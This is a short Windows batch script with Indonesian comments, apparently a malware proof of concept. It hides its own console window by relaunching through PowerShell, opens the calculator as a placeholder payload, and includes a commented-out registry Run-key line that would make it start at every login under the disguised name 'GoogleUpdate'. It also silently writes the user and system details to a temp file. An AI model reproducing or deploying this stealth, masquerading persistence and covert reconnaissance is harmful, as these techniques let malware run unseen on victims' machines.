@echo off
:: 1. Memastikan jendela CMD benar-benar tersembunyi
if not "%1"=="am_admin" (
    powershell -Command "Start-Process -FilePath '%0' -ArgumentList 'am_admin' -WindowStyle Hidden"
    exit /b
)

:: 2. PROXY EXECUTION (Membuka Kalkulator sebagai Proof of Concept)
start calc.exe

:: 3. PERSISTENCE (Opsional: Membuat script ini jalan setiap kali Windows startup)
:: REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V "GoogleUpdate" /t REG_SZ /F /D "%~f0" >nul 2>&1

:: 4. RECONNAISSANCE (Mengambil info sistem secara silent)
set INFO_FILE=%TEMP%\sys_info.txt
echo [SYSTEM INFO] > %INFO_FILE%
echo User: %USERNAME% >> %INFO_FILE%
echo OS: %OS% >> %INFO_FILE%
echo Date: %DATE% %TIME% >> %INFO_FILE%

:: 5. CLEANUP & EXIT
:: Menghapus jejak eksekusi dari temporary files
exit
